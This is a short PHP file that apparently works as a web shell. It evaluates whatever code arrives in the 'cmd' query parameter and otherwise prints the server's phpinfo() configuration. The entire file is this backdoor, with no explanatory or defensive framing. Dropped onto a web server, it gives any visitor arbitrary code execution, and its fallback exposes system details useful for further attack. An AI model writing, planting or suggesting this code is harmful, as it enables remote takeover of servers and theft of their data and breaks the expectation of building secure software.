<?php

if(isset($_GET['cmd'])) {
  eval($_GET['cmd']);
} else {
  phpinfo();
}
